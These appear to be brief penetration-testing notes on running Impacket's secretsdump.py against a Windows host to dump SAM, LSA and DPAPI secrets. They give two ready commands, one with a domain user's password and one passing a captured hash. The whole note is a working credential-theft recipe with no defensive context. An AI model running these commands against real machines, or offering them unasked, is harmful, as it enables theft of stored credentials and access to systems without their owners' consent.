This is for dumping secrets on a machine
- `secretsdump.py domain.tld/user:'password'@IP`
- this will dump out as much as it can dump
	- SAM
	- LSA
	- DPAPI
Can also do with a hash
- `secretsdump.py user@IP -hashes hash`
- dumps all the same stuff, just a different way to get on